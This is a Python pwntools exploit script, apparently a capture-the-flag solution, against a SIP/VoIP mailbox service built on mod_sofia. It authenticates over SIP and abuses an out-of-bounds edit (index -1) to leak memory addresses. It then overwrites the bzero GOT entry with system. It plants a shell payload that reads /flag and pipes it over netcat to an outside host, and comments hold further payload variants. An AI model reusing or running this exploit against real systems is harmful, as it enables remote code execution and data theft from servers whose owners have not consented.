from pwn import *
from requests.auth import HTTPBasicAuth
import requests
import socket
import hashlib
import uuid
import re
import time


server_port = 10002
server_web_port = 10030
# server_ip = '34.84.93.83'
server_ip = '34.146.89.14'
# server_ip = '34.84.18.171'

# server_ip = '10.10.1.1'
# server_port = 8000
# server_web_port = 8001
p = remote(server_ip, server_port)

def gen_str(leng: int) -> str:
    import random
    table = string.hexdigits
    return ''.join(random.choice(table) for _ in range(leng))

def register(user_name):
    url = f"http://{server_ip}:{server_web_port}/register"
    user_data = {
        "name": user_name,
    }

    response = requests.post(url, json=user_data)

    if response.status_code == 200:
        return response.json()['password']
    else:
        print(f"Error: {response.status_code} - {response.text}")

username = gen_str(8)
password = register(username)

call_id =  str(uuid.uuid4())
from_tag = str(uuid.uuid4())

cseq = 1
auth_header = None

def create_sip_message(content, length):
    global cseq
    global auth_header
    recv_ip = p.lhost
    recv_ip = 'cat.moe'
    recv_port = p.lport
    via_branch = 'z9hG4bK' + str(uuid.uuid4())[:8]
    message = f"MESSAGE sip:mailbox@iinevoip SIP/2.0\r\n"
    message += f"Via: SIP/2.0/TCP {recv_ip}:{recv_port};rport;branch={via_branch}\r\n"
    message += "Max-Forwards: 70\r\n"
    message += f"From: <sip:{username}@iinevoip>;tag={from_tag}\r\n"
    message += f"To: <sip:mailbox@iinevoip>\r\n"
    message += f"Call-ID: {call_id}\r\n"
    message += f"CSeq: {cseq} MESSAGE\r\n"
    message += "Content-Type: text/plain\r\n"
    if auth_header:
        message += f"{auth_header}\r\n"
    message += f"Content-Length: {length}\r\n\r\n"
    message = message.encode()
    message += content + b"\r\n"
    cseq += 1
    return message

def register_sip_message():
    global cseq
    global auth_header
    recv_ip = p.lhost
    recv_ip = 'cat.moe'
    recv_port = p.lport
    via_branch = 'z9hG4bK' + str(uuid.uuid4())[:8]
    message = f"REGISTER sip:{server_ip} SIP/2.0\r\n"
    message += f"Via: SIP/2.0/TCP {recv_ip}:{recv_port};rport;branch={via_branch}\r\n"
    message += "Max-Forwards: 70\r\n"
    message += f"From: <sip:{username}@iinevoip>;tag={from_tag}\r\n"
    message += f"To: <sip:{username}@iinevoip>\r\n"
    message += f"Call-ID: {call_id}\r\n"
    message += f"CSeq: {cseq} REGISTER\r\n"
    message += f"Contact: ASDF<sip:{username}@{recv_ip}:{recv_port};transport=TCP>\r\n"
    message += "Expires: 300\r\n"
    message += "Allow: PRACK, INVITE, ACK, BYE, CANCEL, UPDATE, INFO, SUBSCRIBE, NOTIFY, REFER, MESSAGE, OPTIONS\r\n"
    if auth_header:
        message += f"{auth_header}\r\n"
    message += f"Content-Length: 0\r\n\r\n"
    cseq += 1
    return message

def create_auth_header(www_authenticate):
    pattern = re.compile(r'nonce="([^"]+)"')
    match = pattern.search(www_authenticate)
    if match:
        nonce = match.group(1)
        ha1 = hashlib.md5(f"{username}:iinevoip:{password}".encode()).hexdigest()
        ha2 = hashlib.md5(f"MESSAGE:sip:mailbox@iinevoip".encode()).hexdigest()
        response = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
        auth_header = f'Proxy-Authorization: Digest username="{username}", realm="iinevoip", nonce="{nonce}", uri="sip:mailbox@iinevoip", response="{response}", algorithm=MD5'
        return auth_header
    return None

def create_register_header(www_authenticate):
    pattern = re.compile(r'nonce="([^"]+)"')
    match = pattern.search(www_authenticate)
    if match:
        nonce = match.group(1)
        ha1 = hashlib.md5(f"{username}:iinevoip:{password}".encode()).hexdigest()
        ha2 = hashlib.md5(f"REGISTER:sip:{server_ip}".encode()).hexdigest()
        response = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
        auth_header = f'Authorization: Digest username="{username}", realm="iinevoip", nonce="{nonce}", uri="sip:{server_ip}", response="{response}", algorithm=MD5'
        return auth_header
    return None


def init():
    global auth_header
    
    register_message = register_sip_message()
    p.send(register_message.encode())

    response = p.recvuntil(b'\r\n\r\n').decode()

    if "401 Unauthorized" in response:
        www_authenticate = re.search(r'WWW-Authenticate: (.+)\r\n', response).group(1)
        auth_header = create_register_header(www_authenticate)

    register_message = register_sip_message()
    p.send(register_message.encode())

    response = p.recvuntil(b'\r\n\r\n')
    # print(response)

    auth_header = None


    initial_message = create_sip_message(b"hello~", "6")
    p.send(initial_message)

    time.sleep(0.1)
    response = p.recvuntil(b'\r\n\r\n').decode()

    if "407 Proxy Authentication Required" in response:
        www_authenticate = re.search(r'Proxy-Authenticate: (.+)\r\n', response).group(1)
        auth_header = create_auth_header(www_authenticate)

def send(_id, message):
    content = b"/send " + _id + b' ' + message
    message = create_sip_message(content, str(len(content)))
    p.send(message)

    response = b""
    for i in range(0, 2):
        time.sleep(0.1)
        response2 = p.recvuntil(b'\r\n\r\n')
        print(response2)
        length = int(response2.split(b'Content-Length: ')[1])
        if length != 0:
            response2 += p.recv(length)
        response += response2
        

    return response

def mlist():
    message = create_sip_message(b"/list", "5")
    p.send(message)

    response = b""
    for i in range(0, 2):
        time.sleep(0.1)
        response2 = p.recvuntil(b'\r\n\r\n')
        print(response2)
        length = int(response2.split(b'Content-Length: ')[1])
        if length != 0:
            response2 += p.recv(length)
        response += response2

    return response

def delete(idx):
    content = b"/delete " + idx
    message = create_sip_message(content, str(len(content)))
    p.send(message)

    response = b""
    for i in range(0, 2):
        time.sleep(0.1)
        response2 = p.recvuntil(b'\r\n\r\n')
        print(response2)
        length = int(response2.split(b'Content-Length: ')[1])
        if length != 0:
            response2 += p.recv(length)
        response += response2

    return response

def edit(idx, message):
    content = b"/edit " + idx + b' ' + message
    message = create_sip_message(content, str(len(content)))
    p.send(message)

    response = b""
    for i in range(0, 2):
        time.sleep(0.1)
        response2 = p.recvuntil(b'\r\n\r\n')
        print(response2)
        length = int(response2.split(b'Content-Length: ')[1])
        if length != 0:
            response2 += p.recv(length)
        response += response2

    return response

        
init()

user1 = username.encode()
send(user1, (b"A" * 0x10))

for i in range(66, 66 + 0xe, 1):
    send(user1, (chr(i) * 0x1).encode())

# send(user1, b'cat${IFS}/flag${IFS}&1>${IFS}12')
# send(user1, b'nc${IFS}cat.moe${IFS}8003')
send(user1, b'cat${IFS}/flag${IFS}|${IFS}nc${IFS}cat.moe${IFS}8003')

offset = False
for i in range(0x8, 0x100, 0x8):
    edit(b"-1", p8(i))
    data = mlist()
    data = data[data.find(b'0: ')+3:]
    
    if data.count(b"A") != 0x10:
        continue
    
    offset = i 
    break

if offset == False:
    raise ValueError("Failed to leak")

print("SUCCESS : " + hex(offset))
edit(b"-1", p8(offset - 0x10))

data = mlist()
data = data[data.find(b'0: ')+3:]
data = data.split(b'\x0a')
if len(data[0]) == 2:
    temp = u16(data[0]) - 0x1cb0
    edit(b"-1", p16(temp))

data = mlist()
data = data[data.find(b'0: ')+3:]
table = u64(data[:6] + b'\x00\x00')
leak =  table - 0x5a30d0
log.info(hex(leak))

# leak = u64(data[:6] + b'\x00\x00')
# print(hex(leak))

# log.info(hex(leak + 0x1ce0b0))
# environ = leak + 0x1d19e0

# edit(b"-1", p8(offset + 0x31))
# send(user1, b'')
# p.recv()

base = temp + 0xb0
log.info(hex(temp))
log.info(hex(base))

# Set idx[2] => idx[20]
edit(b'-1', p16(base - 0x70)) # 
edit(b'0', p16(base + 0x21))


# Leak bzero
edit(b'-1', p64(leak + 0x6824e0)) # runtime
data = mlist()
data = data[data.find(b'0: ')+3:]
mod_sofia = u64(data[:6] + b'\x00\x00') - 0x400
bzero_got = mod_sofia - 0x1a920
log.info(hex(mod_sofia))
log.info(hex(bzero_got))
log.info(hex(leak + 0x45e90))

# WRite 7 byte address of 'bzero'
edit(b'2', p64(bzero_got)[1:]) #bzero

pause()
edit(b'20', p64(leak + 0x45e90)) # overwrite system

pause()
print(delete(b'15'))
pause()
